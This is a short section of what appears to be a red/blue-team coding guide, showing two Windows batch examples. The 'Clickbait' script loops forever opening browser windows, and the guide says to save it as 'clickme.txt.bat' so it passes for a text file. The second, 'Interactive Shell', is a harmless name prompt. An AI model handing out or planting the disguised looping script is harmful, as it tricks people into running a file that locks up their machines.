## CODE EXAMPLES
1. [CLICKBAIT](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Batch.md#clickbait)
2. [INTERACTIVE SHELL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Batch.md#interactive-shell)

### Clickbait
- Open the browser continuously
- Attention, this code may lead to DoS !
- Save as **clickme.txt.bat**
```
echo off
:LoopStart
start
start www.google.com
goto :LoopStart
```

### Interactive Shell
```
@echo off
echo Hello User! :)
set /p Name=What's your name?
echo Hello %Name% !!!
set /p Input=%Name%, Goodbye!
```
